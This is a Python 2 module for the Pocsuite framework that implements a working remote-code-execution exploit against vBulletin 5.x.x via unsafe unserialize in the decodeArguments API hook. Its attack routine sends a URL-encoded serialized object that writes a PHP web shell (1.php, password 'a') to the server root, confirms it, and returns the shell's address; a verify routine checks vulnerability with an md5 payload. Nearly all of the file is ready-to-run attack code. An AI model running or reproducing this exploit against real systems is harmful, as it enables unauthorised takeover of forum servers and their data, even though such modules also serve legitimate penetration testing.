#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urlparse
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class vB5_RCE(POCBase):
    vulID = "None"
    version = "1"
    author = ["xkon"]
    createDate = "2016-01-24"
    updateDate = "2016-01-24"
    references = ["http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq",
                  "rickgray.me/2015/11/06/unserialize-attack-with-vbulletin-5-x-x-rce.html"]
    name = "_002_vBulletin_5_unserialize_RCE"
    appPowerLink = "https://www.vbulletin.com/"
    appName = "vBulletin"
    appVersion = "5.x.x"
    vulType = "RCE"
    desc = '''
        vBulletin 5.x.x 在反序列化时接受了不安全的输入，导致对象注入，
        可以导致远程代码执行
        '''
    samples = ["http://172.16.0.14:8080/"]

    def _attack(self):
        '''
        在根目录下生成一个shell，1.php
        <?php eval($_POST["a"]);?>
        '''
        result = {}
        payload = "O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A18%3A%22vB_Database_MySQLi%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A55%3A%22file_put_contents%28%271.php%27%2C%27%3C%3Fphp+eval%28%24_POST%5B%22a%22%5D%29%3B%3F%3E%27%29%22%3B%7D"
        vulurl = urlparse.urljoin(self.url, "/ajax/api/hook/decodeArguments?arguments=%s"%payload)
        resp = req.get(vulurl)
        if resp.status_code == 200:
            verify_payload = {"a":"echo md5(0x2333);"}
            shell_url = urlparse.urljoin(self.url, '/1.php')
            resp1 = req.post(shell_url,data=verify_payload)
            if resp1.status_code == 200 and "840c3eda3ea42ecd90aeb3434f3510b7" in resp1.content:
                result['shellURL'] = shell_url+"  password: a"
                return self.parse_attack(result)
        return self.parse_attack(result)

    def _verify(self):
        result = {}
        payload = "O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A18%3A%22vB_Database_MySQLi%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A13%3A%22print+md5%281%29%3B%22%3B%7D"
        vulurl = urlparse.urljoin(self.url, '/ajax/api/hook/decodeArguments?arguments=%s'%payload)
        print vulurl
        resp = req.get(vulurl)
        if resp.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in resp.content:
            result["VerifyInfo"]={}
            result["VerifyInfo"]['URL'] = vulurl
            result["VerifyInfo"]["Payload"] = payload

        return self.parse_attack(result)

    def parse_attack(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("Internet nothing returned")
        return output

register(vB5_RCE)

